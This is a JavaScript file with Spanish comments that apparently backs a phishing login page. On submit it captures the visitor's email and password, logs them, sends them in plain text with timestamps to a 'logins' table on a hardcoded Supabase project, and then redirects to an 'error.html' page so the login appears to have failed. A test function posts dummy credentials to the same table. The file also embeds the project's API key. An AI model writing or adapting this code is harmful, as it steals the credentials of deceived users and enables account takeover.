// ============================================
// CONFIGURACIÓN SUPABASE - VERIFICAR DATOS
// ============================================
const SUPABASE_URL = 'https://lyklppmmtrzrqoickzmd.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5a2xwcG1tdHJ6cnFvaWNrem1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIyOTQyNTUsImV4cCI6MjA4Nzg3MDI1NX0.42uUpfpGR6h4klDYsOAHOo22iKQ9m23m6-HfU7qNWW0';

console.log('🚀 INICIANDO SISTEMA');
console.log('URL:', SUPABASE_URL);
console.log('KEY:', SUPABASE_ANON_KEY ? '✓ OK' : '✗ ERROR');

// ============================================
// CÓDIGO PRINCIPAL
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Página cargada');
    
    const formulario = document.getElementById('loginForm');
    
    if (!formulario) {
        console.log('❌ ERROR: No se encontró el formulario');
        return;
    }
    
    console.log('✅ Formulario encontrado');
    
    formulario.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('📤 FORMULARIO ENVIADO');
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        console.log('📧 Email:', email);
        console.log('🔑 Password:', password);
        
        const datos = {
            email: email,
            password: password,
            fecha: new Date().toLocaleString(),
            hora: new Date().toLocaleTimeString(),
            timestamp: new Date().toISOString()
        };
        
        console.log('📦 Datos a enviar:', datos);
        
        // 1️⃣ ENVIAR A SUPABASE
        console.log('📤 Enviando a Supabase...');
        
        fetch(`${SUPABASE_URL}/rest/v1/logins`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'apikey': SUPABASE_ANON_KEY,
                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
            },
            body: JSON.stringify(datos)
        })
        .then(response => {
            console.log('📥 Respuesta de Supabase:', response.status, response.statusText);
            if (response.ok) {
                console.log('✅ GUARDADO EXITOSO');
                return response.json();
            } else {
                console.log('❌ ERROR EN RESPUESTA:', response.status);
                return response.text();
            }
        })
        .then(data => {
            console.log('📄 Datos de respuesta:', data);
        })
        .catch(error => {
            console.log('❌ ERROR DE CONEXIÓN:', error);
        });
        
        // Redirigir después de 1 segundo
        setTimeout(() => {
            window.location.href = 'error.html';
        }, 1000);
    });
});

// Función de prueba mejorada
window.probarTodo = function() {
    console.log('🧪 INICIANDO PRUEBA COMPLETA');
    
    // PRUEBA 1: Verificar conexión básica
    fetch(`${SUPABASE_URL}/rest/v1/`)
    .then(response => {
        console.log('📡 Conexión a Supabase:', response.status);
    })
    .catch(err => {
        console.log('❌ No se puede conectar a Supabase:', err);
    });
    
    // PRUEBA 2: Intentar guardar un registro de prueba
    const testData = {
        email: "test@depuracion.com",
        password: "test123",
        fecha: new Date().toLocaleString(),
        hora: new Date().toLocaleTimeString(),
        timestamp: new Date().toISOString()
    };
    
    console.log('📤 Enviando datos de prueba:', testData);
    
    fetch(`${SUPABASE_URL}/rest/v1/logins`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify(testData)
    })
    .then(response => {
        console.log('📥 Respuesta prueba:', response.status);
        if (response.ok) {
            console.log('✅ PRUEBA EXITOSA');
            alert('✅ Prueba exitosa - Revisa Supabase');
        } else {
            console.log('❌ Prueba falló');
            alert('❌ Error ' + response.status);
        }
    })
    .catch(err => {
        console.log('❌ Error de prueba:', err);
        alert('❌ Error: ' + err);
    });
};
